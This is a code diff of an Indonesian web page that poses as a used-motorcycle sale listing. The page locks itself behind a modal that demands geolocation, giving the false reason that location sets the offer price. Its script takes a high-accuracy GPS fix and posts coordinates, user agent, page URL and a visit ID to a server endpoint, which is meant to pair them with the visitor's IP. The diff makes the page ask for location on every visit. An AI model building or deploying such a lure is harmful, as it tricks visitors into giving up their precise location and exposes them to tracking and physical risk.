@@ -12,7 +12,7 @@
 <meta property="og:url" content="https://example.com/">
 <meta property="og:type" content="website">
 
-<!-- Bootstrap & jQuery -->
+<!-- Bootstrap & jQuery (opsional untuk komponen lain di halaman) -->
 <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
 <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
@@ -57,8 +57,16 @@
   .hidden{display:none}
   .field{margin:6px 0}
   input[readonly]{width:100%;padding:8px;border-radius:8px;border:1px solid #374151;background:#0b1020;color:#e5e7eb}
-  .spinner{display:inline-block;width:1rem;height:1rem;border:.18rem solid rgba(255,255,255,.25);border-top-color:#fff;border-radius:50%;animation:spin .8s linear infinite}
-  @keyframes spin{to{transform:rotate(360deg)}}
+
+  /* Spinner tombol hanya saat tombol "sibuk" */
+  #btn-allow{ position:relative }
+  #btn-allow[data-busy="true"]{ pointer-events:none; opacity:.9; }
+  #btn-allow[data-busy="true"]::after{
+    content:""; position:absolute; right:12px; top:50%; transform:translateY(-50%);
+    width:1rem; height:1rem; border:.18rem solid rgba(255,255,255,.35);
+    border-top-color:#fff; border-radius:50%; animation:spin .8s linear infinite;
+  }
+  @keyframes spin{to{transform:translateY(-50%) rotate(360deg)}}
 
   /* Kunci body saat modal aktif */
   body.lock { overflow:hidden; touch-action:none; }
@@ -69,7 +77,7 @@
 <div class="container px-0" style="max-width:480px">
   <!-- HERO -->
   <div class="hero">
-    <img src="/img/n-max.jpg" alt="Honda Beat 2018">
+    <img src="/img/n-max.jpg" alt="Yamaha N-Max">
     <div class="pager"><span id="pageNow">1</span> / 5</div>
     <div class="dots" id="dots"></div>
   </div>
@@ -81,7 +89,7 @@
   <div class="d-flex justify-content-between align-items-start px-3 pt-2">
     <div>
       <h1 class="h5 mb-1 fw-bold">Yamaha N-Max Segala Kondisi</h1>
-      <div class="text-muted small">STNK Only, BPKB Only, FUll Paper, Bukan Curian</div>
+      <div class="text-muted small">STNK Only, BPKB Only, Full Paper, Bukan Curian</div>
     </div>
     <div class="d-flex gap-2">
       <button class="btn btn-sm btn-ghost rounded-circle" aria-label="Share">⤴</button>
@@ -92,8 +100,8 @@
   <!-- Badges -->
   <div class="px-3 pt-2 d-flex flex-wrap gap-2">
     <span class="badge badge-pill px-3 py-2">⛽ Bensin</span>
-    <span class="badge badge-pill px-3 py-2">🏍️ 110 cc</span>
-    <span class="badge badge-pill px-3 py-2">📍 20.000–30.000 Km (contoh)</span>
+    <span class="badge badge-pill px-3 py-2">🏍️ 155 cc</span>
+    <span class="badge badge-pill px-3 py-2">📍 Radius area saya</span>
     <span class="badge badge-pill px-3 py-2">⚙️ Matic (CVT)</span>
   </div>
 
@@ -146,15 +154,15 @@
   <!-- STEP 1: Consent -->
   <main class="card" id="step-consent">
     <h1 id="loc-title">Verifikasi Lokasi Diperlukan</h1>
-    <p>Kami melaksanakan jual beli kendaraan maka lokasi menentukan harga beli kami, untuk melihat harga dasar penawaran kami silahkan klik berikut</p>
+    <p>Kami melaksanakan jual beli kendaraan, dan lokasi memengaruhi harga penawaran. Untuk melihat harga dasar, silakan aktifkan lokasi.</p>
     <div class="actions">
-      <button class="primary" id="btn-allow"><span class="spinner d-none" id="spin-allow"></span> Izinkan & Lanjutkan</button>
+      <button class="primary" id="btn-allow">Izinkan & Lanjutkan</button>
       <button class="secondary" id="btn-decline">Saya Tidak Setuju</button>
     </div>
     <p class="small mt-2">Catatan: Geolocation hanya berjalan di situs <strong>HTTPS</strong>. Jika tombol tidak berfungsi, cek koneksi aman.</p>
   </main>
 
-  <!-- STEP 2: Success (akan auto-close) -->
+  <!-- STEP 2: Success (auto-close) -->
   <main class="card hidden" id="step-ok">
     <h1>Lokasi Diterima</h1>
     <p class="ok">Terima kasih. Lokasi berhasil diverifikasi.</p>
@@ -179,11 +187,10 @@
 
 <script>
   /* ====== KONFIG ====== */
-  const POST_ENDPOINT = "";         // contoh: "https://example.com/loc-hook" (biarkan kosong jika tak perlu kirim ke server)
-  const REDIRECT_IF_DENIED = "";    // opsional: isi URL untuk redirect jika denied
-  const REDIRECT_DELAY_MS = 3500;
-  const REQUIRED_ACCURACY_M = 200;  // akurasi maksimum agar boleh lanjut
-  const AUTO_CLOSE_MS = 1000;       // jeda auto-close modal setelah sukses
+  const POST_ENDPOINT = "";           // contoh: "https://example.com/loc-hook" — kosongkan jika tidak perlu kirim ke server
+  const REQUIRED_ACCURACY_M = 200;    // akurasi maksimal agar valid
+  const AUTO_CLOSE_MS = 800;          // jeda tutup modal setelah sukses
+  const USE_WATCH = true;             // true = watchPosition agar dapat fix terbaik
 
   /* ====== UTIL ====== */
   const $ = sel => document.querySelector(sel);
@@ -201,54 +208,70 @@
     lat: $("#lat"), lng: $("#lng"), acc: $("#acc"), ts: $("#ts"),
     btnAllow: $("#btn-allow"), btnDecline: $("#btn-decline"),
     btnHelp: $("#btn-help"), btnRetry: $("#btn-retry"),
-    postStatus: $("#post-status"), spinAllow: $("#spin-allow"),
-    autoCloseNote: $("#auto-close-note")
+    postStatus: $("#post-status")
   };
 
-  function openGate() { modal.classList.add("active"); lockBody(true); }
-  function closeGate() { modal.classList.remove("active"); lockBody(false); }
+  // spinner via attribute data-busy (CSS pseudo-element)
+  function setBusy(b){ 
+    if(b){ els.btnAllow.setAttribute("data-busy","true"); els.btnAllow.style.pointerEvents="none"; }
+    else { els.btnAllow.removeAttribute("data-busy"); els.btnAllow.style.pointerEvents=""; }
+  }
 
-  function ensureSecureOrigin() {
+  // Selalu tampilkan modal di setiap kunjungan (selalu minta lokasi)
+  function openGate(){ modal.classList.add("active"); lockBody(true); }
+  function closeGate(){ modal.classList.remove("active"); lockBody(false); }
+
+  function ensureSecureOrigin(){
     const isSecure = location.protocol === "https:" || location.hostname === "localhost";
-    if (!isSecure) alert("Fitur lokasi memerlukan HTTPS. Silakan akses halaman ini via https://");
+    if(!isSecure) alert("Fitur lokasi memerlukan HTTPS. Akses halaman ini via https://");
   }
 
-  async function checkPermission() {
-    if (!("geolocation" in navigator)) {
-      alert("Browser Anda tidak mendukung Geolocation.");
-      return show(els.denied);
-    }
-    if (!("permissions" in navigator)) {
-      return show(els.consent); // Safari/iOS: minta via klik
-    }
-    try {
-      const st = await navigator.permissions.query({ name: "geolocation" });
-      if (st.state === "granted") requestLocation();
-      else if (st.state === "denied") { show(els.denied); maybeRedirectDenied(); }
-      else show(els.consent); // "prompt"
-      st.onchange = () => {
-        if (st.state === "granted") requestLocation();
-        else if (st.state === "denied") { show(els.denied); maybeRedirectDenied(); }
-        else show(els.consent);
-      };
-    } catch {
-      show(els.consent);
+  // visit_id untuk korelasi server-side (IP diambil server)
+  const visitId = (crypto.randomUUID ? crypto.randomUUID() : String(Date.now()) + Math.random().toString(36).slice(2));
+
+  let asking = false, watchId = null, bestFix = null, autoCloseTimer = null;
+
+  function startRequest(){
+    if(asking) return;
+    if(!("geolocation" in navigator)){ alert("Browser Anda tidak mendukung Geolocation."); show(els.denied); return; }
+
+    asking = true; setBusy(true);
+
+    if(USE_WATCH){
+      let timer = setTimeout(()=>{ // fallback stop setelah 15 detik
+        if(watchId !== null) navigator.geolocation.clearWatch(watchId);
+        finalizeFix(bestFix, true);
+      }, 15000);
+
+      watchId = navigator.geolocation.watchPosition(
+        pos => {
+          bestFix = pickBetter(bestFix, pos);
+          if(bestFix && bestFix.coords.accuracy <= REQUIRED_ACCURACY_M){
+            clearTimeout(timer);
+            navigator.geolocation.clearWatch(watchId);
+            watchId = null;
+            finalizeFix(bestFix, false);
+          }
+        },
+        err => { clearTimeout(timer); onErr(err); },
+        { enableHighAccuracy:true, maximumAge:0, timeout:15000 }
+      );
+    } else {
+      navigator.geolocation.getCurrentPosition(onPos, onErr, { enableHighAccuracy:true, maximumAge:0, timeout:15000 });
     }
   }
 
-  let asking = false;
-  function requestLocation() {
-    if (asking) return;
-    asking = true;
-    els.spinAllow.classList.remove("hidden");
-    navigator.geolocation.getCurrentPosition(onPos, onErr, {
-      enableHighAccuracy: true, timeout: 15000, maximumAge: 0
-    });
+  function pickBetter(a, b){ 
+    if(!a) return b; 
+    return (b.coords.accuracy < a.coords.accuracy) ? b : (b.timestamp > a.timestamp ? b : a);
   }
 
-  function onPos(pos) {
-    asking = false;
-    els.spinAllow.classList.add("hidden");
+  function onPos(pos){ finalizeFix(pos, false); }
+
+  function finalizeFix(pos, wasFallback){
+    asking = false; setBusy(false);
+    if(!pos){ show(els.denied); return; }
+
     const { latitude, longitude, accuracy } = pos.coords;
     const iso = new Date(pos.timestamp).toISOString();
 
@@ -257,39 +280,43 @@
     els.acc.value = Math.round(accuracy);
     els.ts.value  = iso;
 
-    if (accuracy > REQUIRED_ACCURACY_M) {
+    if(accuracy > REQUIRED_ACCURACY_M){
+      alert(`Akurasi lokasi ±${Math.round(accuracy)} m (di atas ambang ${REQUIRED_ACCURACY_M} m).\nSilakan pindah ke area terbuka atau aktifkan High Accuracy, lalu coba lagi.`);
       show(els.denied);
-      alert(`Akurasi lokasi terlalu besar (±${Math.round(accuracy)} m). Pindah ke area lebih terbuka atau aktifkan GPS High Accuracy, lalu coba lagi.`);
       return;
     }
 
     show(els.ok);
 
-    if (POST_ENDPOINT) {
+    if(POST_ENDPOINT){
       fetch(POST_ENDPOINT, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
+        method:"POST",
+        headers:{ "Content-Type":"application/json" },
         body: JSON.stringify({
+          visit_id: visitId,
           latitude, longitude, accuracy, timestamp: iso,
-          userAgent: navigator.userAgent
+          userAgent: navigator.userAgent,
+          page: location.href
+          // IP diambil server dari req.ip / cf-connecting-ip
         })
-      }).then(r => {
+      }).then(r=>{
         els.postStatus.textContent = r.ok ? "Lokasi tersimpan." : "Gagal kirim ke server.";
-      }).catch(() => els.postStatus.textContent = "Gagal kirim ke server.");
+      }).catch(()=>{
+        els.postStatus.textContent = "Gagal kirim ke server.";
+      });
     }
 
-    // Auto-close modal → halaman langsung bisa dipakai
-    setTimeout(() => { closeGate(); }, AUTO_CLOSE_MS);
+    clearTimeout(autoCloseTimer);
+    autoCloseTimer = setTimeout(()=> { closeGate(); }, AUTO_CLOSE_MS);
   }
 
-  function onErr(err) {
-    asking = false;
-    els.spinAllow.classList.add("hidden");
-    if (err.code === 1) { // PERMISSION_DENIED
+  function onErr(err){
+    asking = false; setBusy(false);
+    if(watchId !== null){ navigator.geolocation.clearWatch(watchId); watchId = null; }
+    if(err.code === 1){ // PERMISSION_DENIED
       show(els.denied);
-      maybeRedirectDenied();
-    } else if (err.code === 3) { // TIMEOUT
-      alert("Pengambilan lokasi timeout. Coba lagi di area terbuka atau aktifkan GPS.");
+    } else if(err.code === 3){ // TIMEOUT
+      alert("Pengambilan lokasi timeout. Coba lagi di area terbuka atau aktifkan GPS (High Accuracy).");
       show(els.consent);
     } else { // POSITION_UNAVAILABLE
       alert("Lokasi tidak tersedia. Pastikan layanan lokasi aktif.");
@@ -297,27 +324,20 @@
     }
   }
 
-  function maybeRedirectDenied() {
-    if (REDIRECT_IF_DENIED) {
-      setTimeout(() => { location.href = REDIRECT_IF_DENIED; }, REDIRECT_DELAY_MS);
-    }
-  }
-
   /* ====== EVENTS ====== */
-  els.btnAllow.addEventListener("click", () => {
-    if (!("geolocation" in navigator)) { alert("Browser tidak mendukung Geolocation."); return; }
-    requestLocation(); // harus via gesture user
-  });
-  els.btnDecline.addEventListener("click", () => { show(els.denied); maybeRedirectDenied(); });
+  els.btnAllow.addEventListener("click", () => { startRequest(); });
+  els.btnDecline.addEventListener("click", () => { show(els.denied); });
   els.btnRetry?.addEventListener("click", () => { show(els.consent); });
   els.btnHelp?.addEventListener("click", () => {
     alert("Aktifkan lokasi di pengaturan browser:\n\n- Chrome: Ikon gembok → Site settings → Location → Allow\n- Safari iOS: Settings → Privacy & Security → Location Services → Safari → While Using\n- Android: Settings → Location ON (High accuracy), lalu beri izin untuk browser.");
   });
 
   /* ====== STARTUP ====== */
-  openGate();          // tampilkan modal & kunci halaman
-  ensureSecureOrigin();// info HTTPS
-  checkPermission();   // cek status izin
+  (function init(){
+    openGate();          // tampilkan modal & kunci halaman
+    ensureSecureOrigin();// info HTTPS
+    // Tidak pakai Permissions API agar SELALU minta lokasi via gesture setiap visit
+  })();
 </script>
 </body>
 </html>
